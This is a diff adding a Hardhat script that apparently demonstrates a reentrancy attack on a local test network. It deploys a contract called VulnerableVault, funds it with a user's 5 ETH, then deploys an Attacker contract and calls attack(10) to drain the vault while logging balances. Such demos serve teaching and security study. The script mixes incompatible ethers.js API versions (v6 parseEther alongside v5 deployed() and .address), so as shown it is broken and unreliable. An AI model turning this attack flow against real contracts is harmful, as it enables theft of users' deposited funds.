@@ -1,0 +1,42 @@
+const { ethers } = require("hardhat");
+
+async function main() {
+  const [deployer, attackerSigner, user] = await ethers.getSigners();
+
+  console.log("Accounts:");
+  console.log("Deployer:", deployer.address);
+  console.log("Attacker:", attackerSigner.address);
+  console.log("User:", user.address);
+
+  // Deploy vulnerable vault
+  const Vault = await ethers.getContractFactory("VulnerableVault");
+  const vault = await Vault.connect(deployer).deploy();
+  await vault.deployed();
+  console.log("VulnerableVault deployed:", vault.address);
+
+  // Have 'user' deposit 5 ETH into vault
+  const depositTx = await vault.connect(user).deposit({ value: ethers.parseEther("5") });
+  await depositTx.wait();
+  console.log("User deposited 5 ETH into vault. Vault balance:", ethers.formatEther(await ethers.provider.getBalance(vault.address)));
+
+  // Deploy attacker contract from attackerSigner
+  const Attacker = await ethers.getContractFactory("Attacker");
+  const attacker = await Attacker.connect(attackerSigner).deploy(vault.address);
+  await attacker.deployed();
+  console.log("Attacker contract deployed:", attacker.address);
+
+  // Attacker funds its attack with 1 ETH and requests multiple re-entry iterations
+  console.log("Vault balance before attack:", ethers.formatEther(await ethers.provider.getBalance(vault.address)));
+  const attackTx = await attacker.connect(attackerSigner).attack(10, { value: ethers.parseEther("1") });
+  await attackTx.wait();
+
+  console.log("Attack finished.");
+  console.log("Vault balance after attack:", ethers.formatEther(await ethers.provider.getBalance(vault.address)));
+  console.log("Attacker contract balance:", ethers.formatEther(await ethers.provider.getBalance(attacker.address)));
+  console.log("Attacker signer balance:", ethers.formatEther(await ethers.provider.getBalance(attackerSigner.address)));
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
